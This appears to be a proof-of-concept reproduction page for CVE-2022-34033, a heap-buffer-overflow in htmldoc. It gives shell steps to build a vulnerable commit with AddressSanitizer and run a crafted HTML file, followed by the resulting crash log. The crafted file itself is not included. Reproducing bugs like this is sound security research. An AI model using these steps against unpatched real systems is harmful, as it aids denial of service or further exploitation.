### CVE-2022-34033

### PoC Links
[Github.com](https://github.com/michaelrsweet/htmldoc/issues/425)

### Docker Container Run Command
```shell
docker build -t cve-2022-34033-poc .
docker run -itd --name CVE-2022-34033-POC cve-2022-34033-poc
docker exec -it CVE-2022-34033-POC /bin/bash
```

### PoC Reproduce Command
```shell
# Preparing the initial environment
apt-get update -y
apt-get install git -y

# Configure local SSH for Github and clone the repository. (ssh-keygen)
cd /poc
git clone git@github.com:michaelrsweet/htmldoc.git

# Rollback to the vulnerable version.
cd htmldoc/
git reset --hard ca282d05b74c58235443d20062018604dec0e71b

# Install the compilation and installation dependencies.
apt install gcc make clang pkg-config libtool-bin build-essential llvm-dev libunwind-dev libpng-dev libjpeg-dev libfreetype6-dev zlib1g-dev -y

# Configure, compile, and install.
export CFLAGS="-fsanitize=address -fno-omit-frame-pointer"
export CXXFLAGS="-fsanitize=address -fno-omit-frame-pointer"
export LDFLAGS="-fsanitize=address"

./configure --with-asan
make && make install

# Open the poc file.
htmldoc /poc/poc.html
```

### Description
Observed that:
```
<!DOCTYPE html>
<HTML>
    <HEAD>
        =================================================================
        ==8807==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xffffa3a08ab1 at pc 0xaaaab5109758 bp 0xffffd85f39d0 sp 0xffffd85f31b8
        READ of size 2 at 0xffffa3a08ab1 thread T0
        #0 0xaaaab5109754  (/usr/local/bin/htmldoc+0x8d754) (BuildId: da7b727561a61bf44651b2d842f33d140426fc17)
        #1 0xaaaab510acb0 in __interceptor_fprintf (/usr/local/bin/htmldoc+0x8ecb0) (BuildId: da7b727561a61bf44651b2d842f33d140426fc17)
        #2 0xaaaab519f958  (/usr/local/bin/htmldoc+0x123958) (BuildId: da7b727561a61bf44651b2d842f33d140426fc17)
        #3 0xaaaab519e8b0  (/usr/local/bin/htmldoc+0x1228b0) (BuildId: da7b727561a61bf44651b2d842f33d140426fc17)
        #4 0xaaaab51a47f8  (/usr/local/bin/htmldoc+0x1287f8) (BuildId: da7b727561a61bf44651b2d842f33d140426fc17)
        #5 0xffffa6a573f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8) (BuildId: f37f3aa07c797e333fd106472898d361f71798f5)
        #6 0xffffa6a574c8 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x274c8) (BuildId: f37f3aa07c797e333fd106472898d361f71798f5)
        #7 0xaaaab50eaeac  (/usr/local/bin/htmldoc+0x6eeac) (BuildId: da7b727561a61bf44651b2d842f33d140426fc17)

        0xffffa3a08ab1 is located 0 bytes to the right of 1-byte region [0xffffa3a08ab0,0xffffa3a08ab1)
        allocated by thread T0 here:
        #0 0xaaaab5162060 in __interceptor_malloc (/usr/local/bin/htmldoc+0xe6060) (BuildId: da7b727561a61bf44651b2d842f33d140426fc17)
        #1 0xaaaab5208994  (/usr/local/bin/htmldoc+0x18c994) (BuildId: da7b727561a61bf44651b2d842f33d140426fc17)
        #2 0xaaaab519f0e8  (/usr/local/bin/htmldoc+0x1230e8) (BuildId: da7b727561a61bf44651b2d842f33d140426fc17)
        #3 0xaaaab519f0e8  (/usr/local/bin/htmldoc+0x1230e8) (BuildId: da7b727561a61bf44651b2d842f33d140426fc17)
        #4 0xaaaab519f0e8  (/usr/local/bin/htmldoc+0x1230e8) (BuildId: da7b727561a61bf44651b2d842f33d140426fc17)
        #5 0xaaaab519f0e8  (/usr/local/bin/htmldoc+0x1230e8) (BuildId: da7b727561a61bf44651b2d842f33d140426fc17)
        #6 0xaaaab519e7d4  (/usr/local/bin/htmldoc+0x1227d4) (BuildId: da7b727561a61bf44651b2d842f33d140426fc17)
        #7 0xaaaab51a47f8  (/usr/local/bin/htmldoc+0x1287f8) (BuildId: da7b727561a61bf44651b2d842f33d140426fc17)
        #8 0xffffa6a573f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8) (BuildId: f37f3aa07c797e333fd106472898d361f71798f5)
        #9 0xffffa6a574c8 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x274c8) (BuildId: f37f3aa07c797e333fd106472898d361f71798f5)
        #10 0xaaaab50eaeac  (/usr/local/bin/htmldoc+0x6eeac) (BuildId: da7b727561a61bf44651b2d842f33d140426fc17)

        SUMMARY: AddressSanitizer: heap-buffer-overflow (/usr/local/bin/htmldoc+0x8d754) (BuildId: da7b727561a61bf44651b2d842f33d140426fc17)
        Shadow bytes around the buggy address:
        0x200ff4741100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
        0x200ff4741110: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
        0x200ff4741120: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
        0x200ff4741130: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
        0x200ff4741140: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
        =>0x200ff4741150: fa fa fa fa fa fa[01]fa fa fa 00 01 fa fa 05 fa
        0x200ff4741160: fa fa 00 00 fa fa 07 fa fa fa 06 fa fa fa 00 00
        0x200ff4741170: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
        0x200ff4741180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
        0x200ff4741190: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
        0x200ff47411a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
        Shadow byte legend (one shadow byte represents 8 application bytes):
        Addressable:           00
        Partially addressable: 01 02 03 04 05 06 07
        Heap left redzone:       fa
        Freed heap region:       fd
        Stack left redzone:      f1
        Stack mid redzone:       f2
        Stack right redzone:     f3
        Stack after return:      f5
        Stack use after scope:   f8
        Global redzone:          f9
        Global init order:       f6
        Poisoned by user:        f7
        Container overflow:      fc
        Array cookie:            ac
        Intra object redzone:    bb
        ASan internal:           fe
        Left alloca redzone:     ca
        Right alloca redzone:    cb
        ==8807==ABORTING
```



